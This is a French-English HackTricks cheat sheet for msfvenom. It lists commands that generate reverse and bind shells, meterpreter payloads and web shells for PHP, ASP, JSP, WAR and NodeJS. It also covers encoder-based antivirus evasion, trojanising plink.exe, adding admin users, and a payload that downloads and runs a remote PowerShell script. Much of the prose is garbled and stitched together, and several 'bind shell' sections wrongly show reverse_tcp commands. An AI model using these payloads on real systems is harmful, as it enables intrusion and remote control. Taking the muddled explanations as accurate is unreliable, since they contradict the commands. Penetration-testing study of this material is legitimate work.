# MSFVenom - Fiche de triche

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

**HackenProof est la plateforme des primes de bugs cryptographiques.**

**Obtenez des récompenses sans délai**\
Les primes HackenProof sont lancées uniquement lorsque les clients déposent le budget de récompense. Vous recevrez la récompense après la vérification du bug.

**Acquérez de l'expérience en pentest web3**\
Les protocoles blockchain et les contrats intelligents sont le nouvel Internet ! Maîtrisez la sécurité web3 dès ses débuts.

**Devenez la légende du pirate web3**\
Gagnez des points de réputation avec chaque bug vérifié et conquérez le sommet du classement hebdomadaire.

[**Inscrivez-vous sur HackenProof**](https://hackenproof.com/register) et commencez à gagner grâce à vos piratages !

{% embed url="https://hackenproof.com/register" %}

***

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

On peut également utiliser l'option `-a` pour spécifier l'architecture ou la `--platform`
```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```
## Paramètres courants lors de la création d'un shellcode

When creating a shellcode using `msfvenom`, there are several common parameters that can be used to customize the output. These parameters allow you to tailor the shellcode to your specific needs. Below are some of the most commonly used parameters:

- **`-p`** or **`--payload`**: Specifies the payload to use. This can be a built-in payload or a custom one.
- **`-f`** or **`--format`**: Specifies the output format of the shellcode. This can be `exe`, `elf`, `raw`, `c`, `ruby`, `python`, and more.
- **`-e`** or **`--encoder`**: Specifies the encoder to use. Encoders are used to obfuscate the shellcode and bypass certain security measures.
- **`-b`** or **`--bad-chars`**: Specifies any characters that should be avoided in the shellcode. This is useful when dealing with certain restrictions or filters.
- **`-i`** or **`--iterations`**: Specifies the number of times the encoder should run. Increasing the number of iterations can increase the complexity of the shellcode.
- **`-a`** or **`--arch`**: Specifies the architecture of the target system. This can be `x86`, `x64`, `armle`, `aarch64`, and more.
- **`-o`** or **`--out`**: Specifies the output file where the shellcode will be saved.

These parameters can be combined and customized to create shellcode that suits your specific requirements.
```bash
-b "\x00\x0a\x0d"
-f c
-e x86/shikata_ga_nai -i 5
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
To create a reverse shell payload for Windows, we can use the `msfvenom` tool from the Metasploit Framework. The `msfvenom` tool allows us to generate various types of payloads, including reverse shells.

Here is an example command to generate a reverse shell payload for Windows:

```plaintext
msfvenom -p windows/shell_reverse_tcp LHOST=<your IP address> LPORT=<listening port> -f exe > shell.exe
```

In this command, you need to replace `<your IP address>` with your actual IP address and `<listening port>` with the port number on which you want to listen for incoming connections.

The `-p` option specifies the payload to use, in this case, `windows/shell_reverse_tcp` which creates a reverse shell that connects back to the attacker's machine.

The `-f` option specifies the output format, in this case, `exe` which generates an executable file.

The `>` operator redirects the output to a file named `shell.exe`.

Once you have generated the payload, you can transfer it to the target Windows machine and execute it. When the payload is executed, it will establish a reverse shell connection back to your machine, giving you remote access to the target.

Remember to set up a listener on your machine to catch the incoming connection. You can use tools like `netcat` or `Metasploit` to set up the listener.

Note: This payload may be detected by antivirus software, so it is important to use evasion techniques or modify the payload to bypass detection.
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
A bind shell is a type of shell that listens for incoming connections on a specific port. Once a connection is established, the bind shell provides a command prompt interface to interact with the target system. This allows an attacker to gain remote access and control over the compromised system.

To create a bind shell payload using `msfvenom`, you can use the following command:

```plaintext
msfvenom -p <payload> LHOST=<attacker IP> LPORT=<port> -f <format> -o <output file>
```

- `<payload>`: The payload to use, such as `windows/meterpreter/reverse_tcp` or `linux/x86/shell/bind_tcp`.
- `<attacker IP>`: The IP address of the attacker machine.
- `<port>`: The port number on which the bind shell will listen for incoming connections.
- `<format>`: The desired output format, such as `exe`, `elf`, or `raw`.
- `<output file>`: The name of the output file to save the generated payload.

For example, to create a bind shell payload for a Windows system, listening on port 4444, and save it as `shell.exe`, you can use the following command:

```plaintext
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f exe -o shell.exe
```

Once the payload is generated, you can transfer it to the target system and execute it to establish a bind shell connection.
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
To create a user, you can use the `msfvenom` tool in Metasploit. The `msfvenom` tool allows you to generate various types of payloads, including shellcode, which can be used to create a user on a target system.

Here is an example of how to create a user using `msfvenom`:

```plaintext
msfvenom -p windows/adduser USER=username PASS=password -f exe > adduser.exe
```

This command will generate an executable file called `adduser.exe` that, when executed on a Windows system, will create a user with the specified username and password.

You can customize the payload by changing the `USER` and `PASS` parameters to the desired username and password.

Once you have generated the payload, you can deliver it to the target system using various methods, such as social engineering or exploiting vulnerabilities.

Remember to use these techniques responsibly and only on systems that you have permission to test.
```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
### Shell CMD

Le shell CMD est un shell de commande utilisé principalement sur les systèmes d'exploitation Windows. Il permet aux utilisateurs d'interagir avec le système d'exploitation en exécutant des commandes spécifiques. Le shell CMD est souvent utilisé dans le cadre de l'exploitation de vulnérabilités ou de l'exécution de scripts malveillants lors de tests de pénétration. Il offre une interface en ligne de commande pour exécuter des commandes système, des scripts batch et des programmes exécutables. Le shell CMD peut être utilisé pour effectuer diverses tâches, telles que la navigation dans le système de fichiers, la manipulation de fichiers et de dossiers, l'exécution de programmes, la gestion des services, etc.

#### Génération de payloads avec msfvenom

Msfvenom est un outil puissant inclus dans le framework Metasploit qui permet de générer des payloads pour l'exploitation de vulnérabilités. Il peut être utilisé pour générer des fichiers exécutables malveillants, tels que des fichiers binaires, des scripts, des DLL, etc. Msfvenom offre une grande flexibilité en termes de personnalisation des payloads générés.

Voici un exemple de commande msfvenom pour générer un payload pour le shell CMD :

```plaintext
msfvenom -p windows/shell/reverse_tcp LHOST=<IP de l'attaquant> LPORT=<port d'écoute> -f exe > shell.exe
```

Dans cet exemple, nous utilisons le payload `windows/shell/reverse_tcp` qui permet d'établir une connexion inverse avec l'attaquant. Nous spécifions également l'adresse IP de l'attaquant avec l'option `LHOST` et le port d'écoute avec l'option `LPORT`. Le payload généré est ensuite enregistré dans un fichier exécutable appelé `shell.exe`.

Une fois que le payload est généré, il peut être utilisé pour exploiter une vulnérabilité sur une machine cible. L'attaquant peut envoyer le fichier exécutable malveillant à la cible et, lorsqu'il est exécuté, il établira une connexion avec l'attaquant, lui permettant ainsi d'interagir avec le shell CMD de la machine cible. Cela donne à l'attaquant un accès à distance au système cible et lui permet d'exécuter des commandes arbitraires.
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
### **Exécuter une commande**

The `msfvenom` tool can be used to generate payloads that can execute arbitrary commands on a target system. This can be useful during a penetration test to gain remote access and control over the target.

To generate a payload that executes a command, you can use the following command:

```
msfvenom -p cmd/unix/reverse_netcat LHOST=<attacker IP> LPORT=<attacker port> -f <output format> -o <output file>
```

Replace `<attacker IP>` with the IP address of the machine running the listener, and `<attacker port>` with the port number on which the listener is running.

The `-f` option specifies the output format, which can be one of the following:

- `elf`: Executable and Linkable Format (ELF)
- `exe`: Windows Executable
- `raw`: Raw payload
- `ruby`: Ruby script
- `c`: C code
- `python`: Python script
- `bash`: Bash script

The `-o` option specifies the output file where the payload will be saved.

Once the payload is generated, you can transfer it to the target system and execute it to gain command execution.
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
### Encodeur

L'encodage est une technique utilisée pour modifier le format d'un payload afin de contourner les mécanismes de détection des systèmes de sécurité. L'objectif est de rendre le payload indétectable par les outils de sécurité traditionnels.

L'encodage peut être utilisé pour éviter la détection des signatures de virus, des règles de pare-feu ou des systèmes de détection d'intrusion. Il peut également être utilisé pour contourner les filtres de contenu ou les mécanismes de détection de comportement anormal.

L'encodage peut être réalisé à l'aide d'outils tels que `msfvenom`, qui est un outil de génération de payloads inclus dans le framework Metasploit. `msfvenom` permet de générer des payloads encodés dans différents formats, tels que des fichiers exécutables, des scripts, des documents Office, etc.

L'encodage peut être effectué en utilisant différents algorithmes, tels que `xor`, `sub`, `add`, `rot`, etc. Ces algorithmes modifient les octets du payload d'origine pour générer un nouveau payload encodé.

L'utilisation d'un encodeur peut augmenter les chances de succès d'une attaque en rendant le payload indétectable par les systèmes de sécurité. Cependant, il est important de noter que l'encodage n'est pas une méthode infaillible et peut être contourné par des techniques de décodage avancées.
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
### Intégré à l'intérieur d'un exécutable

Lorsque vous souhaitez incorporer un payload dans un exécutable existant, vous pouvez utiliser la fonctionnalité `msfvenom` de Metasploit Framework. `msfvenom` vous permet de générer un payload personnalisé et de l'injecter dans un fichier exécutable existant.

Pour incorporer un payload dans un exécutable, vous devez spécifier le type de payload, l'architecture cible, le format de sortie et le fichier exécutable cible. Par exemple, pour incorporer un payload de type `reverse_tcp` dans un exécutable Windows 32 bits, vous pouvez utiliser la commande suivante :

```plaintext
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<votre_IP> LPORT=<votre_port> -f exe -o <chemin_vers_le_fichier_executable>
```

Cette commande générera un payload de type `reverse_tcp` avec votre adresse IP et votre port spécifiés comme paramètres. Le payload sera ensuite injecté dans le fichier exécutable spécifié.

Une fois que vous avez incorporé le payload dans l'exécutable, vous pouvez le distribuer comme vous le souhaitez. Lorsque le fichier exécutable est exécuté sur la machine cible, le payload sera déclenché et vous pourrez établir une connexion inversée avec la machine cible. Cela vous permettra d'exécuter des commandes à distance et d'exploiter la machine cible à des fins de test de pénétration.
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```
A reverse shell is a type of payload that allows an attacker to establish a connection from the target machine to their own machine. This enables the attacker to gain remote access to the target machine and execute commands.

To create a reverse shell payload using `msfvenom`, you can use the following command:

```plaintext
msfvenom -p <payload> LHOST=<attacker IP> LPORT=<attacker port> -f <format> -o <output file>
```

Replace `<payload>` with the desired payload, `<attacker IP>` with the IP address of the attacker machine, `<attacker port>` with the port number the attacker machine will listen on, `<format>` with the desired output format, and `<output file>` with the name of the output file.

For example, to create a reverse shell payload using the `bash` payload, with the attacker IP set to `192.168.0.100` and the attacker port set to `4444`, you can use the following command:

```plaintext
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f elf -o reverse_shell.elf
```

This will create a reverse shell payload in ELF format, saved as `reverse_shell.elf`.

Once the payload is created, you can transfer it to the target machine and execute it to establish a reverse shell connection.
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
A bind shell is a type of shell that listens for incoming connections on a specific port. Once a connection is established, the bind shell provides a command prompt interface to interact with the target system. This allows an attacker to gain remote access and control over the compromised system.

To create a bind shell payload using `msfvenom`, you can use the following command:

```plaintext
msfvenom -p <payload> LHOST=<attacker IP> LPORT=<port> -f <format> -o <output file>
```

- `<payload>`: The payload to use, such as `windows/meterpreter/reverse_tcp` or `linux/x86/shell/bind_tcp`.
- `<attacker IP>`: The IP address of the attacker machine.
- `<port>`: The port number on which the bind shell will listen for incoming connections.
- `<format>`: The desired output format, such as `exe`, `elf`, or `raw`.
- `<output file>`: The name of the output file to save the generated payload.

For example, to create a bind shell payload for a Windows system, listening on port 4444, and save it as `shell.exe`, you can use the following command:

```plaintext
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f exe -o shell.exe
```

Once the payload is generated, you can transfer it to the target system and execute it to establish a bind shell connection.
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
### SunOS (Solaris)

SunOS (Solaris) est un système d'exploitation basé sur UNIX développé par Sun Microsystems. Il est largement utilisé dans les environnements d'entreprise et offre une grande stabilité et une sécurité robuste. En tant que hacker, il est important de comprendre les spécificités de SunOS (Solaris) afin de pouvoir exploiter ses vulnérabilités et accéder aux systèmes cibles. Dans cette section, nous examinerons les méthodes et les ressources spécifiques à SunOS (Solaris) pour vous aider à mener à bien vos activités de piratage.
```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
A reverse shell is a type of payload that allows an attacker to establish a connection from the target machine to their own machine. This enables the attacker to gain remote access and control over the target machine. The reverse shell payload can be created using the `msfvenom` tool in Kali Linux.

To create a reverse shell payload for a macOS target, you can use the following command:

```plaintext
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f <output format> > <output file>
```

Replace `<attacker IP>` with the IP address of your machine and `<attacker port>` with the port number you want to use for the connection. Choose an appropriate `<output format>` such as `macho`, `elf`, or `app`.

For example, to create a reverse shell payload in Mach-O format with the attacker IP set to `192.168.0.100` and the port set to `4444`, you can use the following command:

```plaintext
msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f macho > reverse_shell.macho
```

Once the payload is created, you can deliver it to the target machine using various methods such as social engineering, email attachments, or exploiting vulnerabilities. Once the payload is executed on the target machine, it will establish a connection back to your machine, giving you remote access to the target.
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
A bind shell is a type of shell that listens for incoming connections on a specific port. Once a connection is established, the bind shell provides a command prompt interface to interact with the target system. This allows an attacker to gain remote access and control over the compromised system.

To create a bind shell payload using `msfvenom`, you can use the following command:

```plaintext
msfvenom -p <payload> LHOST=<attacker IP> LPORT=<port> -f <format> -o <output file>
```

- `<payload>`: The payload to use, such as `windows/meterpreter/reverse_tcp` or `linux/x86/shell/bind_tcp`.
- `<attacker IP>`: The IP address of the attacker machine.
- `<port>`: The port number on which the bind shell will listen for incoming connections.
- `<format>`: The desired output format, such as `exe`, `elf`, or `raw`.
- `<output file>`: The name of the output file to save the generated payload.

For example, to create a bind shell payload for Windows using the `windows/meterpreter/reverse_tcp` payload, with the attacker IP set to `192.168.0.100` and the bind shell listening on port `4444`, you can use the following command:

```plaintext
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f exe -o bind_shell.exe
```

This will generate an executable file named `bind_shell.exe` that, when executed on the target system, will establish a reverse TCP connection to the attacker's machine, providing a bind shell for remote access and control.
```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
## **Charges utiles basées sur le Web**

### **PHP**

#### Shell inversé
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
The ASP/x reverse shell technique allows an attacker to gain remote access to a target system. This technique involves creating a malicious ASP script that, when executed on the target system, establishes a reverse connection back to the attacker's machine.

To create the ASP/x reverse shell, we can use the `msfvenom` tool from the Metasploit Framework. The `msfvenom` tool allows us to generate various types of payloads, including reverse shells.

Here is an example command to generate an ASP/x reverse shell payload using `msfvenom`:

```plaintext
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f asp > shell.asp
```

In this command, we specify the `windows/meterpreter/reverse_tcp` payload, which establishes a reverse TCP connection. We also provide the IP address and port of the attacker's machine using the `LHOST` and `LPORT` options. Finally, we specify the output file as `shell.asp`.

Once we have generated the ASP/x reverse shell payload, we can upload it to the target system and execute it. This can be done through various means, such as exploiting a vulnerability or tricking a user into running the script.

Once the reverse shell is executed on the target system, it will establish a connection back to the attacker's machine. The attacker can then use this connection to interact with the target system, execute commands, and perform various malicious activities.

It is important to note that the ASP/x reverse shell technique is considered illegal and unethical unless performed with proper authorization for legitimate security testing purposes.
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
Le shell inversé est une technique couramment utilisée en piratage pour établir une connexion entre un attaquant et une machine cible. Cela permet à l'attaquant de contrôler à distance la machine cible et d'exécuter des commandes. Dans cet exemple, nous allons utiliser le langage JSP (JavaServer Pages) pour créer un shell inversé.

##### Étape 1: Générer le payload

Nous allons utiliser l'outil `msfvenom` pour générer notre payload JSP. Assurez-vous d'avoir installé Metasploit Framework sur votre machine.

```plaintext
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<votre adresse IP> LPORT=<votre port> -f raw > shell.jsp
```

Remplacez `<votre adresse IP>` par votre adresse IP et `<votre port>` par le port que vous souhaitez utiliser pour la connexion.

##### Étape 2: Héberger le shell

Maintenant que nous avons généré notre shell JSP, nous devons le mettre à disposition sur un serveur Web. Vous pouvez utiliser n'importe quel serveur Web de votre choix. Par exemple, si vous utilisez Apache, vous pouvez copier le fichier `shell.jsp` dans le répertoire `/var/www/html` de votre serveur.

##### Étape 3: Établir la connexion

Une fois que le shell JSP est hébergé, vous pouvez utiliser un navigateur Web pour accéder à l'URL suivante:

```plaintext
http://<adresse IP du serveur>/<chemin vers le shell.jsp>
```

Remplacez `<adresse IP du serveur>` par l'adresse IP de votre serveur et `<chemin vers le shell.jsp>` par le chemin d'accès au fichier `shell.jsp` sur votre serveur.

##### Étape 4: Contrôler la machine cible

Lorsque vous accédez à l'URL contenant le shell JSP, une connexion sera établie entre votre machine et la machine cible. Vous pouvez maintenant utiliser Metasploit Framework ou tout autre outil de votre choix pour contrôler la machine cible à distance.

**Note:** Assurez-vous d'utiliser cette technique uniquement à des fins légales et avec l'autorisation du propriétaire de la machine cible. Le piratage non autorisé est illégal et punissable par la loi.
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
La technique de reverse shell permet à un attaquant d'établir une connexion depuis une machine compromise vers une machine distante, en utilisant un shell inversé. Cela permet à l'attaquant d'exécuter des commandes sur la machine distante et d'obtenir un accès à distance.

L'outil `msfvenom` est un générateur de coquilles (shells) qui peut être utilisé pour créer des coquilles inversées. Il est inclus dans le framework Metasploit et offre une grande flexibilité pour personnaliser les coquilles en fonction des besoins de l'attaquant.

Pour générer une coquille inversée avec `msfvenom`, vous pouvez utiliser la commande suivante :

```plaintext
msfvenom -p <payload> LHOST=<adresse IP> LPORT=<port> -f <format> -o <fichier de sortie>
```

- `<payload>` : spécifie le type de coquille inversée à générer, par exemple `windows/meterpreter/reverse_tcp` pour une coquille inversée Meterpreter sur Windows.
- `<adresse IP>` : l'adresse IP de la machine distante à laquelle la coquille inversée se connectera.
- `<port>` : le port sur lequel la coquille inversée se connectera.
- `<format>` : le format de sortie de la coquille inversée, par exemple `exe` pour un fichier exécutable Windows.
- `<fichier de sortie>` : le nom du fichier de sortie qui contiendra la coquille inversée générée.

Une fois que vous avez généré la coquille inversée, vous pouvez la transférer sur la machine cible et l'exécuter pour établir la connexion inversée. Cela permettra à l'attaquant d'interagir avec la machine distante et d'exécuter des commandes à distance.

Il est important de noter que l'utilisation de coquilles inversées à des fins malveillantes est illégale et peut entraîner des conséquences juridiques graves. Ces techniques doivent être utilisées uniquement à des fins éthiques, telles que les tests de pénétration autorisés.
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
### NodeJS

NodeJS est une plateforme logicielle open-source basée sur le moteur JavaScript V8 de Google Chrome. Elle permet d'exécuter du code JavaScript côté serveur, ce qui en fait un choix populaire pour le développement d'applications web. NodeJS est connu pour sa capacité à gérer de manière efficace les opérations d'entrée/sortie asynchrones, ce qui le rend adapté aux applications en temps réel et aux serveurs web à haute performance.

#### Injection de code NodeJS

L'injection de code NodeJS est une technique couramment utilisée pour exploiter les vulnérabilités des applications web basées sur NodeJS. Elle consiste à insérer du code malveillant dans une application afin de contourner les mécanismes de sécurité et d'exécuter des commandes non autorisées sur le serveur.

#### Reverse Shell avec NodeJS

Un reverse shell avec NodeJS est une technique utilisée pour établir une connexion entre un serveur compromis et un attaquant distant. Cela permet à l'attaquant d'accéder au serveur compromis et d'exécuter des commandes à distance. Le reverse shell avec NodeJS peut être utilisé pour diverses activités malveillantes, telles que l'exfiltration de données sensibles, l'installation de logiciels malveillants supplémentaires ou la prise de contrôle complète du serveur compromis.

#### Utilisation de msfvenom pour générer un reverse shell NodeJS

Msfvenom est un outil puissant inclus dans le framework Metasploit qui permet de générer des coquilles (shells) malveillantes pour différentes plates-formes. Pour générer un reverse shell NodeJS avec msfvenom, vous pouvez utiliser la commande suivante :

```plaintext
msfvenom -p nodejs/shell_reverse_tcp LHOST=<IP de l'attaquant> LPORT=<port d'écoute de l'attaquant> -f raw > shell.js
```

Cette commande générera un fichier shell.js contenant le code du reverse shell NodeJS. Vous pouvez ensuite l'exécuter sur le serveur cible pour établir une connexion avec l'attaquant distant.

#### Exécution du reverse shell NodeJS

Une fois que vous avez généré le fichier shell.js contenant le code du reverse shell NodeJS, vous pouvez l'exécuter sur le serveur cible en utilisant la commande suivante :

```plaintext
node shell.js
```

Cela lancera le reverse shell NodeJS et établira une connexion avec l'attaquant distant. Vous pourrez alors exécuter des commandes à distance sur le serveur cible.

#### Contre-mesures

Pour se protéger contre les attaques de reverse shell NodeJS, il est recommandé de suivre les bonnes pratiques de sécurité, telles que :

- Mettre à jour régulièrement les packages et les dépendances utilisés dans votre application NodeJS.
- Valider et filtrer correctement toutes les entrées utilisateur pour éviter les injections de code.
- Restreindre les privilèges d'exécution de l'application pour limiter les actions malveillantes.
- Utiliser des pare-feu et des outils de détection d'intrusion pour surveiller et bloquer les activités suspectes.
- Mettre en place des mécanismes de journalisation et d'audit pour détecter les tentatives d'intrusion et les comportements anormaux.

En suivant ces bonnes pratiques, vous pouvez renforcer la sécurité de votre application NodeJS et réduire les risques d'exploitation des vulnérabilités.
```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
Perl is a high-level, general-purpose programming language that is commonly used for scripting and system administration tasks. It is known for its flexibility and powerful text processing capabilities. Perl payloads can be used in various hacking scenarios to exploit vulnerabilities and gain unauthorized access to systems.

#### **Creating a Perl Payload with msfvenom**

The `msfvenom` tool, which is part of the Metasploit Framework, can be used to generate Perl payloads. The following command can be used to create a Perl payload:

```plaintext
msfvenom -p perl/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f raw > payload.pl
```

Replace `<attacker IP>` with the IP address of the machine running the payload, and `<attacker port>` with the desired port number.

#### **Executing the Perl Payload**

To execute the Perl payload, the target machine must have Perl installed. The payload can be executed using the following command:

```plaintext
perl payload.pl
```

Once executed, the payload establishes a reverse TCP connection with the attacker's machine, allowing the attacker to gain control over the target system.

#### **Customizing the Perl Payload**

The Perl payload generated by `msfvenom` can be customized to suit specific requirements. Various options can be used to modify the payload, such as changing the payload type, adding encryption, or specifying a different payload format.

#### **Conclusion**

Perl payloads generated with `msfvenom` provide a powerful tool for hackers to exploit vulnerabilities and gain unauthorized access to systems. By understanding the capabilities of Perl and customizing the payloads, hackers can effectively carry out their malicious activities.
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
### **Python**

Python is a versatile and powerful programming language that is widely used in the field of hacking. Its simplicity and readability make it a popular choice among hackers for developing various hacking tools and scripts. Python provides a wide range of libraries and modules that can be used for different hacking tasks, such as network scanning, vulnerability assessment, and exploit development.

Python's extensive standard library and third-party packages, such as `requests` and `BeautifulSoup`, make it easy to interact with web applications and perform tasks like web scraping and form submission. Additionally, Python's `socket` module allows hackers to create network connections and send/receive data over different protocols.

Python is also commonly used for reverse engineering and malware analysis. Tools like `pycrypto` and `pydasm` provide functionalities for encryption/decryption and disassembling binary files, respectively. Moreover, Python's `subprocess` module allows hackers to execute system commands and interact with the underlying operating system.

In addition to its hacking capabilities, Python is widely used for automation and scripting purposes. Its simplicity and cross-platform compatibility make it an ideal choice for automating repetitive tasks and creating custom tools. Python's `os` and `shutil` modules provide functionalities for file manipulation, while libraries like `selenium` enable automated web browsing and interaction with web applications.

Overall, Python is a versatile and powerful programming language that is widely used in the field of hacking due to its simplicity, readability, and extensive library support. Whether you are a beginner or an experienced hacker, Python can be a valuable tool in your arsenal.
```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
### **Bash**

Bash, également connu sous le nom de Bourne Again SHell, est un interpréteur de commandes populaire utilisé dans les systèmes d'exploitation basés sur Unix. Il offre une interface en ligne de commande pour exécuter des commandes, des scripts et des programmes. Bash est largement utilisé dans le domaine de la programmation et de l'administration système en raison de sa flexibilité et de sa puissance.

Voici quelques fonctionnalités clés de Bash :

- **Auto-complétion** : Bash propose une fonctionnalité d'auto-complétion qui permet de compléter automatiquement les commandes, les noms de fichiers et les chemins d'accès en appuyant sur la touche Tab. Cela facilite la saisie des commandes et réduit les erreurs de frappe.

- **Historique des commandes** : Bash conserve un historique des commandes précédemment exécutées, ce qui permet de les rappeler et de les réutiliser facilement. Il suffit de naviguer dans l'historique à l'aide des touches fléchées et d'appuyer sur Entrée pour exécuter une commande précédente.

- **Redirection des entrées/sorties** : Bash permet de rediriger les entrées et les sorties des commandes vers des fichiers ou d'autres commandes. Par exemple, vous pouvez rediriger la sortie d'une commande vers un fichier ou utiliser le contenu d'un fichier comme entrée pour une commande.

- **Variables et scripts** : Bash prend en charge les variables, ce qui permet de stocker des valeurs et de les utiliser dans les commandes et les scripts. Il permet également d'écrire des scripts pour automatiser des tâches répétitives.

- **Gestion des processus** : Bash permet de gérer les processus en cours d'exécution, tels que les arrêter, les mettre en arrière-plan ou les mettre en pause. Il offre également des fonctionnalités avancées telles que les processus en arrière-plan, les tâches planifiées et les signaux.

Bash est un outil puissant et polyvalent qui peut être utilisé pour diverses tâches, allant de l'automatisation des tâches système à la création de scripts complexes. Il est largement utilisé par les administrateurs système, les développeurs et les hackers en raison de sa flexibilité et de sa facilité d'utilisation.
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

**HackenProof est le lieu de tous les programmes de primes pour les bugs cryptographiques.**

**Obtenez une récompense sans délai**\
Les primes HackenProof sont lancées uniquement lorsque leurs clients déposent le budget de récompense. Vous recevrez la récompense après la vérification du bug.

**Acquérez de l'expérience en pentest web3**\
Les protocoles blockchain et les contrats intelligents sont le nouvel Internet ! Maîtrisez la sécurité web3 dès ses débuts.

**Devenez une légende du hacking web3**\
Gagnez des points de réputation avec chaque bug vérifié et conquérez le sommet du classement hebdomadaire.

[**Inscrivez-vous sur HackenProof**](https://hackenproof.com/register) et commencez à gagner grâce à vos hacks !

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? Ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
